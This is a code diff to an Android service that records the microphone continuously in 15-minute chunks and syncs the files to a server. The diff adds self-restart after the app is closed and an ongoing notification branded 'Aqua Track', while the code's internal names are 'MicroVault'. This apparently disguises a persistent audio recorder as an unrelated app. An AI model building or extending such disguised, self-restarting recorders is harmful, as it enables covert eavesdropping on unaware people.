@@ -8,7 +8,6 @@ import android.media.MediaRecorder
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
-import androidx.annotation.RequiresApi
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import com.example.aquatrack.LoginActivity
@@ -34,41 +33,58 @@ class AudioRecordingService : Service() {
     private var currentFile: File? = null
     private var recorder: MediaRecorder? = null
 
-    @RequiresApi(Build.VERSION_CODES.Q)
+    private fun ensureForeground(status: String) {
+        val notification = getNotification(status)
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
+            } else {
+                startForeground(1, notification)
+            }
+        } catch (t: Throwable) {
+            // Fallback to 2‑param if 3‑param not available / OEM issue
+            try { startForeground(1, notification) } catch (_: Throwable) {}
+        }
+    }
+
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
-
-        // Always call startForeground immediately to avoid RemoteServiceException
-        startForeground(
-            1,
-            getNotification("MicroVault starting..."),
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE else 0
-        )
-
-        // Check RECORD_AUDIO permission after starting foreground
+        ensureForeground("Service starting...")
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
             Log.e(TAG, "RECORD_AUDIO permission not granted. Stopping service.")
-            // Update notification to inform user
-            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
-            notificationManager.notify(1, getNotification("Microphone permission required"))
+            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
+                .notify(1, getNotification("Mic permission required"))
             stopSelf()
             return
         }
-
         val prefs = getSharedPreferences("microvault", MODE_PRIVATE)
         phoneId = prefs.getInt("phone_id", -1)
         queueDir = StorageManager.getRecordingsDirectory(applicationContext)
-
-        // Update notification to active
-        val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
-        notificationManager.notify(1, getNotification("Syncing with server..."))
-
-        // Clean up old recordings on startup
+        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
+            .notify(1, getNotification("Syncing with server..."))
         StorageManager.cleanupOldRecordings(queueDir)
-
         startMonitoring()
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        ensureForeground("Running")
+        return START_STICKY
+    }
+
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        // Attempt restart for longevity on some OEMs
+        val restartIntent = Intent(applicationContext, AudioRecordingService::class.java)
+        val pending = PendingIntent.getService(
+            applicationContext,
+            1001,
+            restartIntent,
+            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
+        )
+        val alarm = getSystemService(ALARM_SERVICE) as AlarmManager
+        // Restart after 5 seconds
+        alarm.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 5000, pending)
+        super.onTaskRemoved(rootIntent)
     }
 
     private fun startMonitoring() {
@@ -100,12 +116,12 @@ class AudioRecordingService : Service() {
         recordingJob = scope.launch {
             while (isActive) {
                 startNewChunk()
-                delay(60_000) // 15 minutes
+                delay(CHUNK_DURATION_MS) // chunk length
                 stopAndQueue()
             }
         }
         isRecording = true
-        Log.d("AudioService", "Recording loop started.")
+        Log.d(TAG, "Recording loop started.")
     }
 
     private fun stopRecordingLoop() {
@@ -113,7 +129,7 @@ class AudioRecordingService : Service() {
         stopAndQueue()
         recordingJob = null
         isRecording = false
-        Log.d("AudioService", "Recording loop stopped.")
+        Log.d(TAG, "Recording loop stopped.")
     }
 
     private fun startNewChunk() {
@@ -121,7 +137,7 @@ class AudioRecordingService : Service() {
 
         // Check available space before starting
         if (!StorageManager.ensureAvailableSpace(queueDir, REQUIRED_SPACE)) {
-            Log.w("AudioService", "Not enough storage space available")
+            Log.w(TAG, "Not enough storage space; attempting cleanup")
             StorageManager.cleanupOldRecordings(queueDir) // Try to free up space
             return
         }
@@ -143,7 +159,7 @@ class AudioRecordingService : Service() {
             start()
         }
 
-        Log.d("AudioService", "Recording started: ${currentFile?.name}")
+        Log.d(TAG, "Recording started: ${currentFile?.name}")
     }
 
     private fun stopAndQueue() {
@@ -194,9 +210,10 @@ class AudioRecordingService : Service() {
         return NotificationCompat.Builder(this, "microvault")
             .setContentTitle("Aqua Track")
             .setContentText(content)
-            .setSmallIcon(android.R.drawable.ic_lock_silent_mode) // Use a built-in Android icon as a placeholder
+            .setSmallIcon(R.drawable.aquazen)
             .setContentIntent(pendingIntent)
             .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setOngoing(true)
             .build()
     }
 
@@ -214,5 +231,6 @@ class AudioRecordingService : Service() {
     companion object {
         private const val TAG = "AudioService"
         private const val REQUIRED_SPACE = 10 * 1024 * 1024L // 10MB minimum required space
+        private const val CHUNK_DURATION_MS = 15 * 60 * 1000L // 15 minutes
     }
 }
